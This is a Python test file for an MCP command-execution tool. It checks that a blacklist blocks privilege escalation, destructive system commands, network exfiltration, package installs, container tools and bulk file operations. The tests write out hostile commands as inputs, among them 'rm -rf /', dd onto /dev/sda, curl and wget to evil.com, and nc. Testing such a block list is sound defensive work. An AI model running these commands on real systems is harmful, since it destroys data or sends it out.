"""Tests for ralph/mcp/tool_exec.py — MCP exec tool handler."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from ralph.mcp.tools.coordination import CapabilityDeniedError, InvalidParamsError
from ralph.mcp.tools.exec import (
    _DEFAULT_TIMEOUT_MS as DEFAULT_TIMEOUT_MS,
)
from ralph.mcp.tools.exec import (
    ExecRunDeps,
    ExecutionError,
    WorkspaceWithRoot,
    apply_exec_policy,
    check_command,
    check_container_escape,
    check_destructive_system,
    check_multi_file_operation,
    check_network_exfiltration,
    check_package_manager,
    check_privilege_escalation,
    check_version_control,
    format_exec_result,
    handle_exec_command,
    parse_exec_params,
    run_command,
)

CUSTOM_TIMEOUT_MS = 5000
EXPECTED_TIMEOUT_SECONDS = 2.5


class MockSession:
    """Mock session for capability checks."""

    def __init__(self, capabilities: set[str]) -> None:
        self.session_id = "test-session"
        self._capabilities = capabilities

    def check_capability(self, capability: str) -> object:
        return capability in self._capabilities


class MockWorkspaceRoot:
    """Mock workspace with root property."""

    def __init__(self, root: Path | str) -> None:
        self.root = Path(root) if isinstance(root, str) else root


# =============================================================================
# parse_exec_params tests
# =============================================================================


class TestParseExecParams:
    def test_parses_valid_params(self) -> None:
        params = {"command": "ls", "args": ["-la"], "timeout_ms": CUSTOM_TIMEOUT_MS}
        result = parse_exec_params(params)
        assert result.command == "ls"
        assert result.args == ["-la"]
        assert result.timeout_ms == CUSTOM_TIMEOUT_MS

    def test_defaults_timeout(self) -> None:
        params = {"command": "ls", "args": []}
        result = parse_exec_params(params)
        assert result.timeout_ms == DEFAULT_TIMEOUT_MS

    def test_ignores_non_string_args(self) -> None:
        params = {"command": "ls", "args": ["-la", 123, None, True], "timeout_ms": 1000}
        result = parse_exec_params(params)
        assert result.args == ["-la"]

    def test_missing_command_raises(self) -> None:
        params: dict[str, object] = {"args": []}
        with pytest.raises(InvalidParamsError):
            parse_exec_params(params)

    def test_non_string_command_raises(self) -> None:
        params: dict[str, object] = {"command": 123, "args": []}
        with pytest.raises(InvalidParamsError):
            parse_exec_params(params)

    def test_invalid_timeout_uses_default(self) -> None:
        params = {"command": "ls", "args": [], "timeout_ms": -1}
        result = parse_exec_params(params)
        assert result.timeout_ms == DEFAULT_TIMEOUT_MS

    def test_non_int_timeout_uses_default(self) -> None:
        params: dict[str, object] = {"command": "ls", "args": [], "timeout_ms": "fast"}
        result = parse_exec_params(params)
        assert result.timeout_ms == DEFAULT_TIMEOUT_MS


# =============================================================================
# check_command / blacklist tests
# =============================================================================


class TestCheckVersionControl:
    def test_git_is_blacklisted(self) -> None:
        reason = check_version_control("git", ["status"])
        assert reason is not None
        assert "git" in reason.lower()

    def test_svn_is_blacklisted(self) -> None:
        reason = check_version_control("svn", ["update"])
        assert reason is not None

    def test_allowed_command_returns_none(self) -> None:
        reason = check_version_control("ls", [])
        assert reason is None

    def test_git_uppercase_is_blacklisted(self) -> None:
        reason = check_version_control("GIT", ["status"])
        assert reason is not None


class TestCheckPrivilegeEscalation:
    def test_sudo_is_blacklisted(self) -> None:
        reason = check_privilege_escalation("sudo", ["ls"])
        assert reason is not None
        assert "sudo" in reason.lower()

    def test_su_is_blacklisted(self) -> None:
        reason = check_privilege_escalation("su", ["-"])
        assert reason is not None

    def test_allowed_command_returns_none(self) -> None:
        reason = check_privilege_escalation("cat", [])
        assert reason is None


class TestCheckDestructiveSystem:
    def test_shutdown_is_blacklisted(self) -> None:
        reason = check_destructive_system("shutdown", ["-h", "now"])
        assert reason is not None
        assert "shutdown" in reason.lower()

    def test_reboot_is_blacklisted(self) -> None:
        reason = check_destructive_system("reboot", [])
        assert reason is not None

    def test_rm_rf_root_is_blacklisted(self) -> None:
        reason = check_destructive_system("rm", ["-rf", "/"])
        assert reason is not None
        assert "rm" in reason.lower()

    def test_rm_rf_home_is_blacklisted(self) -> None:
        reason = check_destructive_system("rm", ["-rf", "/home/user"])
        assert reason is not None

    def test_rm_rf_dotfile_is_blacklisted(self) -> None:
        reason = check_destructive_system("rm", ["-rf", "~/.bashrc"])
        assert reason is not None

    def test_rm_without_flags_is_allowed(self) -> None:
        reason = check_destructive_system("rm", ["file.txt"])
        assert reason is None

    def test_mkfs_with_dev_target_is_blacklisted(self) -> None:
        reason = check_destructive_system("mkfs", ["/dev/sda1"])
        assert reason is not None

    def test_dd_with_dev_output_is_blacklisted(self) -> None:
        reason = check_destructive_system("dd", ["if=/dev/zero", "of=/dev/sda"])
        assert reason is not None

    def test_kill_minus_9_1_is_blacklisted(self) -> None:
        reason = check_destructive_system("kill", ["-9", "1"])
        assert reason is not None
        assert "kill" in reason.lower()


class TestCheckNetworkExfiltration:
    def test_curl_to_external_url_is_blacklisted(self) -> None:
        reason = check_network_exfiltration("curl", ["https://evil.com"])
        assert reason is not None
        assert "curl" in reason.lower()

    def test_wget_to_external_url_is_blacklisted(self) -> None:
        reason = check_network_exfiltration("wget", ["http://evil.com/file"])
        assert reason is not None

    def test_curl_to_localhost_is_allowed(self) -> None:
        reason = check_network_exfiltration("curl", ["http://localhost:8080"])
        assert reason is None

    def test_curl_to_127_0_0_1_is_allowed(self) -> None:
        reason = check_network_exfiltration("curl", ["http://127.0.0.1:8080"])
        assert reason is None

    def test_curl_without_url_flag_is_allowed(self) -> None:
        reason = check_network_exfiltration("curl", ["--version"])
        assert reason is None

    def test_nc_is_blacklisted(self) -> None:
        reason = check_network_exfiltration("nc", ["-l", "8080"])
        assert reason is not None

    def test_ssh_to_remote_is_blacklisted(self) -> None:
        reason = check_network_exfiltration("ssh", ["user@host"])
        assert reason is not None

    def test_scp_to_remote_is_blacklisted(self) -> None:
        reason = check_network_exfiltration("scp", ["file.txt", "user@host:/path"])
        assert reason is not None


class TestCheckPackageManager:
    def test_apt_install_is_blacklisted(self) -> None:
        reason = check_package_manager("apt", ["install", "vim"])
        assert reason is not None
        assert "apt" in reason.lower()

    def test_yum_install_is_blacklisted(self) -> None:
        reason = check_package_manager("yum", ["install", "vim"])
        assert reason is not None

    def test_pip_install_user_is_blacklisted(self) -> None:
        reason = check_package_manager("pip", ["install", "--user", "requests"])
        assert reason is not None
        assert "pip" in reason.lower()

    def test_pip_install_global_is_blacklisted(self) -> None:
        reason = check_package_manager("pip3", ["install", "-g", "requests"])
        assert reason is not None

    def test_npm_install_global_is_blacklisted(self) -> None:
        reason = check_package_manager("npm", ["install", "-g", "lodash"])
        assert reason is not None

    def test_cargo_install_is_blacklisted(self) -> None:
        reason = check_package_manager("cargo", ["install", "ripgrep"])
        assert reason is not None

    def test_gem_install_global_is_blacklisted(self) -> None:
        reason = check_package_manager("gem", ["install", "rake"])
        assert reason is not None

    def test_gem_install_user_is_allowed(self) -> None:
        reason = check_package_manager("gem", ["install", "--user-install", "rake"])
        assert reason is None

    def test_apt_update_is_blacklisted(self) -> None:
        # "update" is in the blocked flags list
        reason = check_package_manager("apt", ["update"])
        assert reason is not None


class TestCheckContainerEscape:
    def test_docker_is_blacklisted(self) -> None:
        reason = check_container_escape("docker", ["ps"])
        assert reason is not None
        assert "docker" in reason.lower()

    def test_podman_is_blacklisted(self) -> None:
        reason = check_container_escape("podman", ["images"])
        assert reason is not None

    def test_allowed_command_returns_none(self) -> None:
        reason = check_container_escape("ps", ["aux"])
        assert reason is None


class TestCheckMultiFileOperation:
    def test_find_exec_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("find", [".", "-exec", "rm", "{}"])
        assert reason is not None
        assert "find" in reason.lower()

    def test_find_delete_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("find", [".", "-delete"])
        assert reason is not None

    def test_xargs_rm_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("xargs", ["rm", "-rf"])
        assert reason is not None
        assert "xargs" in reason.lower()

    def test_sed_inplace_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("sed", ["-i", "s/foo/bar/", "file.txt"])
        assert reason is not None
        assert "sed" in reason.lower()

    def test_awk_inplace_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("awk", ["-i", "{print}", "file.txt"])
        assert reason is not None

    def test_rename_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("rename", ["foo", "bar", "*.txt"])
        assert reason is not None

    def test_chmod_recursive_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("chmod", ["-R", "755", "/path"])
        assert reason is not None
        assert "chmod" in reason.lower()

    def test_cp_recursive_with_glob_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("cp", ["-rf", "*.txt", "/dest"])
        assert reason is not None

    def test_tar_extract_in_place_is_blacklisted(self) -> None:
        reason = check_multi_file_operation("tar", ["-xf", "archive.tar.gz"])
        assert reason is not None

    def test_allowed_command_returns_none(self) -> None:
        reason = check_multi_file_operation("cat", ["file.txt"])
        assert reason is None


class TestCheckCommandIntegration:
    def test_empty_command_is_allowed(self) -> None:
        reason = check_command("", [])
        assert reason is None

    def test_whitespace_command_is_allowed(self) -> None:
        reason = check_command("   ", [])
        assert reason is None

    def test_all_blacklist_checks_applied(self) -> None:
        # Test that all individual check functions are called
        # by checking one that would fail the first check
        reason = check_command("sudo", ["ls"])
        assert reason is not None


# =============================================================================
# apply_exec_policy tests
# =============================================================================


class TestApplyExecPolicy:
    def test_allowed_command_passes(self) -> None:
        apply_exec_policy("ls", ["-la"])

    def test_denied_command_raises(self) -> None:
        with pytest.raises(CapabilityDeniedError):
            apply_exec_policy("git", ["status"])


# =============================================================================
# run_command tests
# =============================================================================


class TestRunCommand:
    def test_successful_command(self, tmp_path: Path) -> None:
        result = run_command("echo", ["hello"], tmp_path, 5000)
        assert result.returncode == 0
        assert "hello" in result.stdout.decode()

    def test_failing_command(self, tmp_path: Path) -> None:
        result = run_command("false", [], tmp_path, 5000)
        assert result.returncode != 0

    def test_file_not_found_raises_execution_error(self, tmp_path: Path) -> None:
        with pytest.raises(ExecutionError):
            run_command("nonexistent_command_xyz", [], tmp_path, 5000)

    def test_zero_timeout_means_no_timeout(self, tmp_path: Path) -> None:
        result = run_command("echo", ["test"], tmp_path, 0)
        assert result.returncode == 0

    def test_workspace_with_str_root(self, tmp_path: Path) -> None:
        result = run_command("echo", ["test"], str(tmp_path), 5000)
        assert result.returncode == 0

    def test_uses_injected_cwd_provider_when_workspace_has_no_root(self) -> None:
        seen: dict[str, object] = {}

        def fake_runner(command: list[str], cwd: Path, timeout_seconds: float | None):
            seen["cwd"] = cwd
            return MagicMock(returncode=0, stdout=b"ok", stderr=b"")

        fallback = Path("/virtual/fallback")
        run_command(
            "python",
            ["--version"],
            object(),
            1000,
            deps=ExecRunDeps(runner=fake_runner, cwd_provider=lambda: fallback),
        )

        assert seen["cwd"] == fallback

    def test_uses_injected_runner(self, tmp_path: Path) -> None:
        seen: dict[str, object] = {}
        workspace = MockWorkspaceRoot(tmp_path)

        def fake_runner(command: list[str], cwd: Path, timeout_seconds: float | None):
            seen["command"] = command
            seen["cwd"] = cwd
            seen["timeout"] = timeout_seconds
            return MagicMock(returncode=0, stdout=b"ok", stderr=b"")

        result = run_command(
            "python",
            ["--version"],
            workspace,
            2500,
            deps=ExecRunDeps(runner=fake_runner),
        )

        assert result.returncode == 0
        assert seen["command"] == ["python", "--version"]
        assert seen["cwd"] == tmp_path
        assert seen["timeout"] == EXPECTED_TIMEOUT_SECONDS


# =============================================================================
# format_exec_result tests
# =============================================================================


class TestFormatExecResult:
    def test_format_includes_command_and_exit_code(self) -> None:
        process = MagicMock()
        process.stdout = b"output"
        process.stderr = b""
        process.returncode = 0
        result = format_exec_result("echo", ["test"], process, 5000)
        assert "echo" in result
        assert "test" in result
        assert "0" in result

    def test_format_includes_stdout_and_stderr(self) -> None:
        process = MagicMock()
        process.stdout = b"hello"
        process.stderr = b"error"
        process.returncode = 1
        result = format_exec_result("cmd", [], process, 5000)
        assert "hello" in result
        assert "error" in result
        assert "1" in result

    def test_format_adds_timeout_note_when_under_threshold(self) -> None:
        process = MagicMock()
        process.stdout = b""
        process.stderr = b""
        process.returncode = 0
        result = format_exec_result("cmd", [], process, 45000)
        assert "timeout" in result.lower()


# =============================================================================
# handle_exec_command tests
# =============================================================================


class TestHandleExecCommand:
    def test_exec_with_valid_command_succeeds(self, tmp_path: Path, monkeypatch) -> None:
        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "echo", "args": ["hello"], "timeout_ms": 5000}

        result = handle_exec_command(session, workspace, params)
        assert result.is_error is False
        assert "hello" in result.content[0].text

    def test_exec_without_capability_raises(self, tmp_path: Path) -> None:
        session = MockSession(set())  # No capabilities
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "ls", "args": []}

        with pytest.raises(CapabilityDeniedError):
            handle_exec_command(session, workspace, params)

    def test_exec_with_blacklisted_command_raises(self, tmp_path: Path) -> None:
        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "git", "args": ["status"]}

        with pytest.raises(CapabilityDeniedError):
            handle_exec_command(session, workspace, params)

    def test_exec_returns_error_on_nonzero_exit(self, tmp_path: Path, monkeypatch) -> None:
        session = MockSession({"ProcessExecBounded"})
        workspace = MockWorkspaceRoot(tmp_path)
        params: dict[str, object] = {"command": "false", "args": [], "timeout_ms": 5000}

        result = handle_exec_command(session, workspace, params)
        assert result.is_error is True


# =============================================================================
# WorkspaceWithRoot protocol tests
# =============================================================================


class TestWorkspaceWithRootProtocol:
    def test_path_object_satisfies_protocol(self) -> None:
        ws = MockWorkspaceRoot(Path("/tmp"))
        assert isinstance(ws, WorkspaceWithRoot)
        assert ws.root == Path("/tmp")

    def test_str_root_also_works(self, tmp_path: Path) -> None:
        # The _workspace_root helper should handle string roots
        result = run_command("echo", ["test"], str(tmp_path), 5000)
        assert result.returncode == 0
